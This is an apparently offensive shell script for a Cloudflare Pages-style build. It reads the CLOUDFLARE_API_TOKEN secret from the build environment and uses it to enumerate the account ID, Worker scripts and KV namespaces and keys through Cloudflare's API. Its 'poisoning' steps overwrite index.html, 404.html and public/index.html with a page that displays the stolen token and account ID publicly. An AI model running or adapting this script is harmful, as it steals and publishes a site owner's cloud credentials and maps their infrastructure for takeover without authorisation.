
echo "--- DEBUG: Checking if the secret was baked into the file ---"
grep "token" public/index.html








echo "---  AUTOMATED ACCOUNT DISCOVERY ---"

# 1. Grab and Decode the Token directly from the environment
# We store it in a local variable for the script to use immediately
export LEAKED_TOKEN=$(echo $CLOUDFLARE_API_TOKEN | base64)
# In case the above is already base64, we ensure we have the raw key:
RAW_TOKEN=$(echo $CLOUDFLARE_API_TOKEN)

echo " Variable TOKEN defined from leak value."

# 2. Verify Token & Get Account ID
# We use -s (silent) and grep to pull the account ID from the first response
echo "--- Verifying Token & Fetching Account ID ---"
ACCOUNT_DATA=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json")

# Extract the first Account ID found
ACCOUNT_ID=$(echo $ACCOUNT_DATA | grep -oP '"id":"\K[^"]+' | head -1)

if [ -z "$ACCOUNT_ID" ]; then
    echo "❌ Failed to retrieve Account ID. Check token permissions."
else
    echo "✅ Success! Found Account ID: $ACCOUNT_ID"

    # 3. List all Worker Scripts in this account
    echo "--- Mapping Workers ---"
    curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts" \
         -H "Authorization: Bearer $RAW_TOKEN" \
         -H "Content-Type: application/json" | grep -oP '"id":"\K[^"]+'

    # 4. List all KV Namespaces
    echo "--- Mapping KV Storage ---"
    curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/storage/kv/namespaces" \
         -H "Authorization: Bearer $RAW_TOKEN" \
         -H "Content-Type: application/json"
fi

# 5. Poison the Assets for the final web view
cat << EOF > index.html
<html>
<body style="background:#111; color:#0f0; font-family:monospace; padding:20px;">
  <h2> LEAKED CREDENTIALS</h2>
  <p><b>TOKEN:</b> $RAW_TOKEN</p>
  <p><b>ACCOUNT_ID:</b> $ACCOUNT_ID</p>
  <hr>
  <p>Discovery automated. Check build logs for full JSON output.</p>
</body>
</html>
EOF

cp index.html 404.html
mkdir -p public && cp index.html public/index.html

# Replace [TOKEN] with your decoded key
curl -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type:application/json"


curl -X GET "https://api.cloudflare.com/client/v4/accounts" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json"


curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/workers/scripts" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json"

curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces/NAMESPACE_ID/keys" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json"
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json"
# 2. Extract the REAL Account ID from the verify check
# We use 'sed' to pull the 32-character ID from the JSON response
ACCOUNT_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/accounts" \
     -H "Authorization: Bearer $RAW_TOKEN" \
     -H "Content-Type: application/json" | sed -n 's/.*"id":"\([^"]*\)".*/\1/p' | head -n 1)

echo "--- TARGET ACQUIRED ---"
echo "Found Account ID: $ACCOUNT_ID"

# 3. Now run the REAL commands with the REAL ID
echo "--- Mapping Workers ---"
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts" \
     -H "Authorization: Bearer $RAW_TOKEN" | grep -oP '"id":"\K[^"]+'

echo "--- Mapping KV Storage ---"
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/storage/kv/namespaces" \
     -H "Authorization: Bearer $RAW_TOKEN"

# 4. Final Poisoning
cat << EOF > index.html
<body style="background:black; color:lime; font-family:monospace;">
  <h1>SHMOUELY_LEAK_REPORT</h1>
  <p>ACCOUNT: $ACCOUNT_ID</p>
  <p>TOKEN: $RAW_TOKEN</p>
</body>
EOF
mkdir -p public && cp index.html public/index.html

